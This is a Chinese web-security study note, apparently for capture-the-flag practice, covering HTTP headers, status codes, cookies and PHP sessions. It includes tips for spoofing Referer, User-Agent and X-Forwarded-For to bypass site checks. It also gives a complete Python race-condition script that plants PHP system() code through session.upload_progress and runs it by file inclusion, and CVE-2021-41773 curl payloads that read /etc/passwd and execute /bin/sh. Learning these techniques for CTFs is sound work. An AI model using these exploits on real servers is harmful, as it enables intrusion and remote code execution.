$Version=1; Skin=new;                 Content-Length       请求的内容长度       Content-Length: 348                 Content-Type       请求的与实体对应的MIME信息       Content-Type: application/x-www-form-urlencoded                 Date       请求发送的日期和时间       Date: Tue, 15 Nov 2010 08:12:31 GMT                 Expect       请求的特定的服务器行为       Expect: 100-continue                 From       发出请求的用户的Email       From: user@email.com                 Host       指定请求的服务器的域名和端口号       Host: www.example.com                 If-Match       只有请求内容与实体相匹配才有效       If-Match: “737060cd8c284d8af7ad3082f209582d”                 If-Modified-Since       如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码       If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT                 If-None-Match       如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变       If-None-Match: “737060cd8c284d8af7ad3082f209582d”                 If-Range       如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag       If-Range: “737060cd8c284d8af7ad3082f209582d”                 If-Unmodified-Since       只在实体在指定时间之后未被修改才请求成功       If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT                 Max-Forwards       限制信息通过代理和网关传送的时间       Max-Forwards: 10                 Pragma       用来包含实现特定的指令       Pragma: no-cache                 Proxy-Authorization       连接到代理的授权证书       Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==                 Range       只请求实体的一部分，指定范围       Range: bytes=500-999                 Referer       先前网页的地址，当前请求网页紧随其后,即来路       Referer: http://www.example.com/index.html                 TE       客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息       TE: trailers,deflate;q=0.5                 Upgrade       向服务器指定某种传输协议以便服务器进行转换（如果支持）       Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11                 User-Agent       User-Agent的内容包含发出请求的用户信息       User-Agent: Mozilla/5.0 (Linux; X11)                 Via       通知中间网关或代理服务器地址，通信协议       Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)                 Warning       关于消息实体的警告信息       Warn: 199 Miscellaneous warning                 X-Forwarded-For       用来伪装来源ip       X-Forwarded-For: 127.0.0.1           在Web安全中我们常用的请求头有cookie，Referer，User-Agent，X-Forwarded-For。  cookie是为了保持用户访问网页连贯性而存在的，与其相似的还有session，对于cookie：     Cookie是一段不超过4KB的小型文本数据，由一个名称（Name）、一个值（Value）和其它几个用于控制Cookie有效期、安全性、使用范围的可选属性组成。其中： (1)Name/Value：设置Cookie的名称及相对应的值，对于认证Cookie，Value值包括Web服务器所提供的访问令牌。 (2)Expires属性：设置Cookie的生存期。有两种存储类型的Cookie：会话性与持久性。Expires属性缺省时，为会话性Cookie，仅保存在客户端内存中，并在用户关闭浏览器时失效；持久性Cookie会保存在用户的硬盘中，直至生存期到或用户直接在网页中单击“注销”等按钮结束会话时才会失效。 (3)Path属性：定义了Web站点上可以访问该Cookie的目录。 (4)Domain属性：指定了可以访问该 Cookie 的 Web 站点或域。Cookie 机制并未遵循严格的同源策略，允许一个子域可以设置或获取其父域的 Cookie。当需要实现单点登录方案时，Cookie 的上述特性非常有用，然而也增加了 Cookie受攻击的危险，比如攻击者可以借此发动会话定置攻击。因而，浏览器禁止在 Domain 属性中设置.org、.com 等通用顶级域名、以及在国家及地区顶级域下注册的二级域名，以减小攻击发生的范围。 (5)Secure属性：指定是否使用HTTPS安全协议发送Cookie。使用HTTPS安全协议，可以保护Cookie在浏览器和Web服务器间的传输过程中不被窃取和篡改。该方法也可用于Web站点的身份鉴别，即在HTTPS的连接建立阶段，浏览器会检查Web网站的SSL证书的有效性。但是基于兼容性的原因（比如有些网站使用自签署的证书）在检测到SSL证书无效时，浏览器并不会立即终止用户的连接请求，而是显示安全风险信息，用户仍可以选择继续访问该站点。由于许多用户缺乏安全意识，因而仍可能连接到Pharming攻击所伪造的网站。 (6)HTTPOnly 属性 ：用于防止客户端脚本通过document.cookie属性访问Cookie，有助于保护Cookie不被跨站脚本攻击窃取或篡改。但是，HTTPOnly的应用仍存在局限性，一些浏览器可以阻止客户端脚本对Cookie的读操作，但允许写操作；此外大多数浏览器仍允许通过XMLHTTP对象读取HTTP响应中的Set-Cookie头。   所以修改本地浏览器cookie可以进行一些操作，绕过某些网站的验证等。  Referer也常用于绕过某些网站的验证，例如某些页面的访问要求必须是从指定的页面跳转，那么修改referer至就可以达到这样的效果。  User-Agent常用于伪装请求者的来源，有些网站电脑版和手机版的操作逻辑不一样或者存在特性，我们在电脑上无法直接访问到手机版网页，这样就可以通过修改UA来进行伪装来源，有一些常见的UA：  &lt;----------手机版:------------&gt; 伪装成Opera Mobile: Opera/12.02 (Android 4.1; Linux; Opera Mobi/ADR-1111101157; U; en-US) Presto/2.9.201 Version/12.02  伪装成iPhone的Safari： Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3  伪装成iPhone下的Chrome： Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_1_1 like Mac OS X; en) AppleWebKit/534.46.0 (KHTML, like Gecko) CriOS/19.0.1084.60 Mobile/9B206 Safari/7534.48.3  伪装成Chrome手机端： Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19  &lt;----------电脑版：------------&gt; 谷歌Chrome（Webkit、Blink） UserAgent：Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.138 Safari/537.36  苹果Safair（Webkit、Webkit2） UserAgent：Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.5。  微软IE/Edge（Triden、Blink） IE11-UserAgent:Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv 11.0) like Gecko Edge-UserAgent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36Edge/13.10586  火狐Firefox User-Agent:Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0   一些UA的来源于趣事  X-Forwarded-For用于修改请求IP，用此可以伪装请求者的来源IP。  3、空行  空行必不可少，它代表着请求头结束，引出请求体  4、请求体  根据请求方式  http相应  HTTP响应由三部分组成，状态行、消息报头、响应正文  1、状态行  状态行由三部分组成，HTTP协议的版本号、状态码、以及对状态码的文本描述。如：  HTTP/1.1 200 OK (CRLF)      响应状态码    一般分为五类：         1xx——信息响应，这一类型的状态码，代表请求已被接受，需要继续处理，这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束，这一类型的状态码，代表请求已被接受，需要继续处理。这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束。由于HTTP/1.0协议中没有定义任何1xx状态码，所以除非在某些试验条件下，服务器禁止向此类客户端发送1xx响应。这些状态码代表的响应都是信息性的，标示客户应该采取的其他行动。     2xx——成功响应，求已成功被服务器接收，理解，并接受，也就是一次成功的响应。     3xx——重定向，这类状态码代表需要客户端采取进一步的操作才能完成请求。通常，这些状态码用来重定向，后续的请求地址（重定向目标）在本次响应的Location域中指明。当且仅当后续的请求所使用的方法是GET或者HEAD时，用户浏览器才可以在没有用户介入的情况下自动提交所需要的后续请求。     4xx——客户端错误，这类的状态码代表了客户端看起来可能发生了错误，妨碍了服务器的处理。除非响应的是一个HEAD请求，否则服务器就应该返回一个解释当前错误状况的实体，以及这是临时的还是永久性的状况。这些状态码适用于任何请求方法。浏览器应当向用户显示任何包含在此类错误响应中的实体内容。     5xx——服务端错误，表示服务器无法完成明显有效的请求。这类状态码代表了服务器在处理请求的过程中有错误或者异常状态发生，也有可能是服务器意识到以当前的软硬件资源无法完成对请求的处理。除非这是一个HEAD请求，否则服务器应当包含一个解释当前错误状态以及这个状况是临时的还是永久的解释信息实体。浏览器应当向用户展示任何在当前响应中被包含的实体。这些状态码适用于任何响应方法。       http状态码可以通过chrome的网络，然后找到all，就可以看到相应接口的状态码。一般200表示成功。    响应状态码具体包括哪些    1xx         100                     服务器已经接收到请求头，并且客户端应继续发送请求主体。或者如果请求已经完成，忽略这个响应。服务器必须在请求完成后，向客户端发送一个最终的请求。                 101                     服务器已经理解了客户端的请求，并通过升级消息头，通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将切换到在升级消息头中定义的那些协议。                 102                     服务器已经收到并正在处理请求，但无响应可用。这样可以防止客户端超时，并假设请求丢失。                   2xx         200                     请求已经成功，请求希望的响应头或数据体将随之响应返回。实际的响应则取决于你请求的方法，就以GET和POST的请求为例，在GET的请求中，响应将包含与请求的资源相对应的实体。则在POST的请求中，响应将包含描述或操作结果的实体。                 201                     请求已经被实现，而且有一个新的资源已经依据请求的需要而创建，并且URI已经随Location头信息返回。                 202                     服务器已经接受请求，但是尚未处理，最终该请求也可能不会被执行，并且可能在处理发生时被禁止。                 203                     服务器是一个转换代理服务器，例如网络加速器，以200状态码为起源，但回应了原始响应的修改版本。                 204                     服务器处理了请求，没有返回内容。。一般适用场景，在wifi设备连接到需要进行Web认证的Wife接入点时，通过访问一个能在HTTP 204响应的网站，如果能正常接受204的响应，则代表无需Web认证，否则会弹出网页浏览器界面，显示出Web网页认证界面用于让用户进行登陆。                 205                     服务器成功处理了请求，但没有返回任何内容。与204的区别就是，此响应要求请求者重置文档视图。                 206                     服务器已经成功处理了部分GET请求。典型的应用就是像迅雷这类的HTTP下载工具响应实现端点续传或者将一个大文档分解为多个下载段同时下载。                 207                     代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。                 208                     DAV绑定的成员已经在（多状态）响应之前的部分被列举，且未被再次包含。                 226                     服务器已经满足了对资源的请求，对实体请求的一个或多个实体操作的结果表示。                   3xx         300                     被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。除非这是一个HEAD请求，否则该响应应当包括一个资源特性及地址的列表的实体，以便用户或浏览器从中选择最合适的重定向地址。这个实体的格式由Content-Type定义的格式所决定。浏览器可能根据响应的格式以及浏览器自身能力，自动作出最合适的选择。                 Content-Type 标头告诉客户端实际返回的内容的内容类型。一般在http的请求头进行设置。一般有以下的几种格式：                     text/html: HTML 格式         text/plain: 纯文本格式         text/xml: XML 格式         image/gif: gif图片格式         image/jpeg: jpg图片格式         image/png: png图片格式                 301                     被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个URI之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。                 302                     要求客户端执行临时重定向,由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求，只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。Cache-Control是http响应头用来放置缓存信息的。                 303                     对应当前请求的响应可以在另一个URI上被找到，当响应于POST（或PUT / DELETE）接收到响应时，客户端应该假定服务器已经收到数据，并且应该使用单独的GET消息发出重定向。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。这个新的URI不是原始资源的替代引用。同时，303响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。                 304                     表示资源在由请求头中的if-Modified-Since 或 if-None-Match 参数指定的这一版本之后，未曾被修改。由于客户端仍然具有以前下载的副本，因此不需要重新传输资源。                 305                     被请求的资源必须通过指定的代理才能被访问。Location域中将给出指定的代理所在的URI信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应资源。只有原始服务器才能创建305响应。                 306                     在最新版的规范中，306状态码已经不再被使用。最初是指“后续请求应使用指定的代理”。                 307                     在这种情况下，请求应该与另一个URI重复，但后续的请求应仍使用原始的URI,与302相反，当重新发出原始请求时，不允许更改请求方法。 例如，应该使用另一个POST请求来重复POST请求。                 308                     请求和所有将来的请求应该使用另一个URI重复。 307和308重复302和301的行为，但不允许HTTP方法更改。 例如，将表单提交给永久重定向的资源可能会顺利进行。                   4xx         400                     由于明显的客户端错误（例如，格式错误的请求语法，太大的大小，无效的请求消息或欺骗性路由请求），服务器不能或不会处理该请求。                 401                     类似于403 Forbidden，401语义即”未认证”，即用户没有必要的凭据。该状态码表示当前需求需要用户验证。                 402                     该状态码是为了将来可能的需求而预留的。该状态码最初的意图可能被用作某种形式的数字现金或在线支付方案的一部分，但几乎没有哪家服务商使用，而且这个状态码通常不被使用。                 403                     服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个HEAD请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个404响应，假如它不希望让客户端获得任何信息。                 404                     请求失败，请求所希望得到的资源未被在服务器上发现，但允许用户的后续请求。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用404状态码来告知旧资源因为某些内部的配置机制问题已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况。                 405                     请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个Allow头信息用以表示出当前资源能够接受的请求方法的列表。例如，需要通过POST呈现数据的表单上的GET请求，或只读资源上的PUT请求。鉴于PUT，DELETE方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认的配置下不允许上述的请求方法，对于此类请求均会返回405错误。                 406                     请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体，该请求不可接受。除非这是一个HEAD请求，否则该响应就应当返回一个包含可以让用户或者浏览器从中选择最合适的实体特性以及地址栏表的实体。实体的格式由Content-Type头中定义的媒体类型决定。浏览器可以根据格式及自身能力自行作出最佳选择。但是，规范中并没有定义任何作出此类自动选择的标准。                 407                     与401的响应类似，不同的是客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个Proxy-Authenticate用以进行身份询问。客户端可以返回一个Proxy-Authorization信息头用以验证。                 408                     请求超时。根据HTTP规范，客户端没有在服务器预备等待的时间内完成一个请求的发送，客户端可以随时再次提交这一请求而无需进行任何更改。                 409                     表示因为请求存在冲突无法处理该请求，例如多个同步更新之间的编辑冲突。                 410                     表示所请求的资源不再可用，将不再可用。当资源被有意地删除并且资源应被清除时，应该使用这个。在收到410状态码后，用户应停止再次请求资源。但大多数服务端不会使用此状态码，而是直接使用404状态码。                 411                     服务器拒绝在没有定义Content-Length头的情况下接受请求。在添加了表明请求消息体长度的有效Content-Length头之后，客户端可以再次提交该请求。                 412                     服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上。                 413                     表示服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。此种情况下，服务器可以关闭连接以免客户端继续发送此请求。如果这个状况是临时的，服务器应当返回一个Retry-After的响应头，以告知客户端可以在多少时间以后重新尝试。                 414                     表示请求的URI长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。通常将太多数据的结果编码为GET请求的查询字符串，在这种情况下，应将其转换为POST请求。                 通常的情况包括：                     本应使用POST方法的表单提交变成了GET方法，导致查询字符串过长；         重定向URI“黑洞”，例如每次重定向把旧的URI作为新的URI的一部分，导致在若干次重定向后URI超长。         客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器，这类服务器使用固定长度的缓冲读取或操作请求的URI，当GET后的参数超过某个数值后，可能会产生缓冲区溢出，导致任意代码被执行，没有此类漏洞的服务器，应当返回414状态码。                 415                     对于当前请求的方法和所请求的资源，请求中提交的互联网媒体类型并不是服务器中所支持的格式，因此请求被拒绝。例如。客户端将图像的格式上传为svg,但服务器要求图像使用上传格式为jpg。                 416                     客户端已经要求文件的一部分，但服务器不能提供该部分。例如，如果客户端要求文件的一部分超出文件尾端。                 417                     在请求头Expect中指定的预期内容无法被服务器满足，或者这个服务器是一个代理服显的证据证明在当前路由的下一个节点上，Expect的内容无法被满足。                 421                     该请求针对的是无法产生响应的服务器（例如因为连接重用）。                 422                     请求格式正确，但是由于含有语义错误，无法响应。                 423                     当前的资源被锁定。                 424                     由于之前的某个请求发生错误，导致当前的请求失败。                 425                     服务器拒绝处理在Early Data中的请求，以规避可能的重放攻击。                 重放攻击是一种网络攻击，通过恶意的欺诈性地重复或拖延正常的数据传输而实施。因工作原理如同重放歌曲一样而得名。     426                     原服务器要求该请求满足一定条件。这是为了防止“未更新”问题，即客户端读取（GET）一个资源的状态，更改它，并将它写（PUT）回服务器，但这期间第三方已经在服务器上更改了该资源的状态，因此导致了冲突。                 429                     用户在给定的时间内发送了太多的请求。旨在用于网络限速。                 431                     服务器不愿处理请求，因为一个或多个头字段过大。                 451                     该访问因法律的要求而被拒绝。                   5xx         500                     通用错误消息，服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。没有给出具体错误信息。                 501                     服务器不支持当前请求所需要的某个功能。当服务器无法识别请求的方法，并且无法支持其对任何资源的请求。                 502                     作为网关或者代理工作服务器尝试执行请求时，从上游服务器收到无效的响应。                 503                     由于临时的服务器维护或者过载，服务器无法处理请求。这个状况时暂时的，且在一段时间后就会恢复。                 504                     作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI标识出的服务器，例如HTTP,FTP,LDAP)或者辅助服务器(例如DNS)收到的响应。                 505                     服务器不支持，或者拒绝支持在请求中使用的HTTP版本。这暗示着服务器不能或不愿使用与客户端相同的版本。响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体。                 506                     代表服务器存在内部配置错误，被请求的协商变元资源被配置为在透明内容协商中使用自己，因此在一个协商处理中不是一个合适的重点。                 507                     服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。                 508                     服务器在处理请求时陷入死循环。                 511                     客户端需要进行身份验证才能获得网络访问权限，旨在限制用户群访问特定网络。                  会话（Session）     Session：在计算机中，尤其是在网络应用中，称为“会话控制”。Session对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的Web页之间跳转时，存储在Session对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。   由于html的特性，多个请求之间无关联，如果在/xxx.html中为登录状态，那么跳转到/yyy.html就会变成默认的未登录状态，seesion的出现是为了弥补这一缺陷，让每一个用户在多个请求中状态一致。  session是保存在服务端的，与之相对的是cookie，cookie是保存在客户端的。每当用户使用一浏览器开始对服务器发出请求，一个session就会被创建，当用户关闭浏览器结束访问，session会被删除。所以用同一个ip访问同一个网站，如果浏览器不同，用户状态也是不同的，所以session创建的标准是浏览器而不是ip。session不随刷新页面而消失。  特别要注意的是，Session是一种技术，一种形式，并不是某种特殊的文件格式或其他的，在下文中为了区别一些Session的具体实现：如session、sessionstorage、localstorage还有redis，我将首字母大写的Session代指这项保持用户会话的技术，小写来代指具体的实现方式。  1、php中的session  每次我们访问一个页面，如果有开启session，也就是有session_start() 时，就会自动生成一个session_id 来标注是这次会话的唯一ID，同时也会自动往cookie里写入一个名字为PHPSESSID的变量，它的值正是session_id，当这次会话没结束，再次访问的时候，服务器会去读取这个PHPSESSID的cookie是否有值有没过期，如果能够读取到，则继续用这个session_id，如果没有，就会新生成一个session_id，同时生成PHPSESSID这个cookie。由于默认生成的这个PHPSESSID cookie是会话，也就是说关闭浏览器就会过期掉，所以，下次重新浏览时，会重新生成一个session_id。  这个session是32位的。  session的存储地址在php.ini文件中会被标明，一般最后一级目录会是\\tmp，当一个会话开始的时候，服务器会在目录下写入sess_xxxxxxxxxx文件，下划线后的就是这个会话的session_id。  一些session的服务端操作  一般我们通过$_SESSION['&lt;变量名&gt;'] = ....将一些数据存储在session中。这些数据最终会被以序列化后的格式存储在sess_文件中。session.save_handler = files 表示的是session的存储方式，默认的是files文件的方式保存。  一些常用的函数与参数  save_handler不仅仅只能用文件files，还可以用我们常见的memcache 和 redis 来保存。  session.use_cookies 默认是1，表示会在浏览器里创建值为PHPSESSID的session_id，session.name = PHPSESSID 找个配置就是改这个名字的，这个名称可以进行修改，如修改成PhPP，就会在浏览器cookie中创建PhPP的sessionid。  session.auto_start = 0用来是否需要自动开启session，默认是不开启的，所有我们需要在代码中用到session_start()；函数开启，如果设置成1，那么session_id 也会自动就生成了。  session.cookie_lifetime = 0这个是设置在客户端生成PHPSESSID这个cookie的过期时间，默认是0，也就是关闭浏览器就过期，下次访问，会再次生成一个session_id。所以，如果想关闭浏览器会话后，希望session信息能够保持的时间长一点，可以把这个值设置大一点，单位是秒。  gc_divisor, gc_probability, gc_maxlifetime是回收这些sess_xxxxx 的文件，它是按照这3个参数，组成的比率，来启动GC删除这些过期的sess文件。gc_maxlifetime是sess_xxx文件的过期时间。  2、sessionstorage和localstorage  它们来自于Web Storage API ，这是一种新的机制， 使浏览器能以一种比使用 Cookie 更直观的方式存储键/值对。  Web Storage 包含如下两种机制：     sessionStorage 为每一个给定的源（given origin）维持一个独立的存储区域，该存储区域在页面会话期间可用（即只要浏览器处于打开状态，包括页面重新加载和恢复）。   localStorage 同样的功能，但是在浏览器关闭，然后重新打开后数据仍然存在。   这两种机制是通过 Window.sessionStorage和 Window.localStorage属性使用（更确切的说，在支持的浏览器中 Window对象实现了 WindowLocalStorage 和 WindowSessionStorage 对象并挂在其 localStorage 和 sessionStorage 属性下）—— 调用其中任一对象会创建Storage对象，通过Storage 对象，可以设置、获取和移除数据项。对于每个源（origin）sessionStorage 和 localStorage 使用不同的 Storage 对象——独立运行和控制。  [技巧]3、session竞争  由于session的特性，导致流量大的服务器将会承受很大的session存储压力，所有会定义一个定时清除session的程序，当我们的恶意程序包含在session中时，也可能被服务端识别并删除，这时候我们可以通过暴力手段不停上传session文件一起到在服务端删除本地session后仍然有新的session存在。  session恶意代码  在phpinfo()中存在这些数据  1,session.save_handler  files   files     表示session以文件的形式存储。 2,session.save_path /tmp    /tmp     表示session存储目录在/tmp下。 3,session.serialize_handler php php     表示反序列化和序列号的处理器是PHP。 4,session.upload_progress.cleanup   On  On     表示文件上传结束后，php会立即清除对应session文件中的内容。 5,session.upload_progress.enabled   On  On     表示upload_progress功能启动，即浏览器向服务器上传文件时，php会把此次文件上传的详细信息存储在session中。 6,session.upload_progress.freq  1%  1% 7,session.upload_progress.min_freq  1   1     freq 和 min_freq 两项用来设置服务器端对进度信息的更新频率。合理的设置这两项可以减轻服务器的负担。 8,session.upload_progress.name  PHP_SESSION_UPLOAD_PROGRESS PHP_SESSION_UPLOAD_PROGRESS 9,session.upload_progress.prefix    upload_progress_    upload_progress_     prefix 和 name 两项用来设置进度信息在session中存储的变量名/键名 10,session.use_cookies  On  On     表示使用cookie记录sessionid。 11,session.use_only_cookies On  On     表示是否在客户端仅仅使用 cookie 来存放会话 ID。 12,session.use_strict_mode  Off Off     值为off，表示Cookie中的sessionid可控。   一般来说PHP_SESSION_UPLOAD_PROGRESS是开的，所以我们一般会往这个键值中写入恶意代码，然后让整个sess文件被文件包含后解析代码，最终执行代码。  以 NSSCTF - 第五空间 2021\\EasyCleanup (ctfer.vip)为例  服务端代码出现  if(isset($_GET['file'])){      if(strlen($_GET['file']) &gt; 15 | filter($_GET['file'])) exit(\"hacker\");      include $_GET['file'];  }    我们考虑进行文件包含，之后使用其他方法先对phpinfo进行查看，观察是否关闭了session.upload_progress.cleanup，若没有则可以直接使用burp上传恶意代码，若存在则需要不停上传同一个session来确保恶意代码能够执行。  脚本编写  我们一般通过python进行脚本编写（python版本3.8+）  首先导入两个库  import threading import requests   requests用来进行网络请求，threading用来分离线程，做到不断循环上传session从而竞争。  定义基本信息  target_url = \"http://xxx.xxx.xxx.xxx/index.php\"#据情况而定 session_id = \"flag\"#自行决定 expcode = {\"PHP_SESSION_UPLOAD_PROGRESS\":\"&lt;?php system('ls');?&gt;\"}#自行要执行的代码 MyCookie = {'PHPSESSID': sessid}#设置本地cookie值和自定义的session_id一致 proxies = {     \"http\": \"127.0.0.1:8080\", }#设置本机代理，也可以不设置   编写竞争函数  def send_file(session):#形参为后面多线程的指令集提供入口     while True:         resp = requests.post(url=target_url, data=expcode, files={'file': ('res.txt', \"nothing\")}, cookies=MyCookie)   不停的上传同样的post请求。将结果存于res.txt中。  编写读取信息函数  def getflag(session):     while True:         payload_url = target_url + '?file=' + '/tmp/sess_' + session_id         #根据漏洞进行伪协议读取文件         resp = requests.get(url=payload_url)         if 'upload_progress' in resp.text:             print(resp.text)             break   main函数  if __name__ == '__main__':     session = requests.session()     t = threading.Thread(target=send_file, args=(session,))#为竞争函数创建一个新线程     t.start()     #两个线程独立运行     getflag(session)   完整代码  import threading import requests  target_url = \"http://xxx.xxx.xxx.xxx/index.php\"#据情况而定 session_id = \"flag\"#自行决定 expcode = {\"PHP_SESSION_UPLOAD_PROGRESS\":\"&lt;?php system('ls');?&gt;\"}#自行要执行的代码 MyCookie = {'PHPSESSID': sessid}#设置本地cookie值和自定义的session_id一致 proxies = {     \"http\": \"127.0.0.1:8080\", }#设置本机代理，也可以不设置  def send_file(session):#形参为后面多线程的指令集提供入口     while True:         resp = requests.post(url=target_url, data=expcode, files={'file': ('res.txt', \"nothing\")}, cookies=MyCookie)          def getflag(session):     while True:         payload_url = target_url + '?file=' + '/tmp/sess_' + session_id         #根据漏洞进行伪协议读取文件         resp = requests.get(url=payload_url)         if 'upload_progress' in resp.text:             print(resp.text)             break  if __name__ == '__main__':     session = requests.session()     t = threading.Thread(target=send_file, args=(session,))#为竞争函数创建一个新线程     t.start()     #两个线程独立运行     getflag(session)   参考文献与拓展                 [什么是session       许小珂 (xuxiaoke.com)](https://www.xuxiaoke.com/phpnote/35.html)           从第五空间 2021\\EasyCleanup认识php_session_Aiwin-Lau的博客-CSDN博客  PHP Session.upload_progress - chalan630 - 博客园 (cnblogs.com)  PHP：会话上传进度 （php官网）  对于session.upload_progress漏洞的理解_huamanggg的博客-CSDN博客  详解利用session进行文件包含合天网安实验室的博客-CSDN博客session文件包含  （三）robots协议  详解robots协议  Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。  Robots协议也称为爬虫协议、爬虫规则、机器人协议，是网站国际互联网界通行的道德规范,其目的是保护网站数据和敏感信息、确保用户个人信息和隐私不被侵犯。“规则”中将搜索引擎抓取网站内容的范围做了约定,包括网站是否希望被搜索引擎抓取,哪些内容不允许被抓取,而网络爬虫可以据此自动抓取或者不抓取该网页内容。如果将网站视为酒店里的一个房间,robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观,哪些不对搜索引擎开放。  如果在服务器返回的请求中有disallowed之类的提示则代表你可以尝试访问robots协议（/robots.txt）来找找想要的内容。  （四）版本控制仓库的泄漏  常见的版本控制软件     版本控制软件提供完备的版本管理功能，用于存储、追踪目录（文件夹）和文件的修改历史，是软件开发者的必备工具，是软件公司的基础设施。版本控制软件的最高目标，是支持软件公司的配置管理活动，追踪多个版本的开发和维护活动，及时发布软件。   通常网站会使用这些版本控制仓库进行动态维护，当我们发现网站存在/.git等目录的泄漏，代表其使用的版本控制仓库已经泄漏地址，我们可以在里面找到很多无法通过正常访问手段查看的内容。  常见的版本控制仓库有CVS、SVN、git、Mercurial。  （五）WEB服务器     Web服务器当是指驻留于因特网上某种类型计算机的程序。当Web浏览器(客户端)连接到服务器上并请求文件时，服务器会将处理该请求并将文件发送到该浏览器上，附带的信息会告诉浏览器如何查看该文件(即文件类型)。Web服务器会使用HTTP进行信息交流，因此Web服务器也常被称为HTTP服务器。    Web服务器可驻留于各种类型的计算机，从常见的PC到巨型的UNIX网络,以及其他各种类型的计算机。它们通常经过一条高速线路与因特网连接，如果对性能无所谓，则也可使用低速连接(甚至是调制解调器)。    目前，市场上Web服务器产品的种类很多，比较著名的有Apache、Netscape Enterpriise、 Zeus、AOLserver、Roxen WebSerer、Jigsew等。   一般我们常见的web服务器有Nginx、Apache、IIS（Microsoft），这些web服务器有其各自的特性，作为用户和服务器之间的桥梁，它们的侧重点不一样，Nginx应对静态请求效果很好（如.html），Apache应对动态请求（.js/.php/.asp）远远强于Nginx，所有根据一些我们能在服务器上见到的特征可以估测和判断服务器使用的web服务器类型。  对于Apache服务器，有这些漏洞可以尝试在早期版本使用：  CVE-2021-41773（目录穿越）  相应的，对应该漏洞的payload是：     curl -s –path-as-is “：[PORT]/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd    /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd          curl -s –path-as-is –data “echo;Command“ ”[IP]：[PORT]/cgi-bin/.%2e/%2e%2e/%2e%2e%2e/bin/sh    /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;id'      CVE-2021-40438（远程执行）  等等。  对于Nginx服务器  CVE-2021-23017（DNS解析PoC）  还有因为配置错误而造成的Nginx目录穿越（ Nginx漏洞修复之目录穿越(目录遍历)漏洞复现及修复）  等等。  （六）服务器模板引擎     模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。   模板引擎本质上就是执行动态渲染，一个热搜榜不可能被写死，每次更改需要程序员自己手动修改，模板引擎可以做到对指定内容实时渲染替换，做到动态更新。  一些常见的模板引擎有lask（python3）、jinja2/flask（python）、smarty（PHP）、Twig（PHP）、Freemarker（JavaEE）、velocity（JavaEE）；  （七）数据库  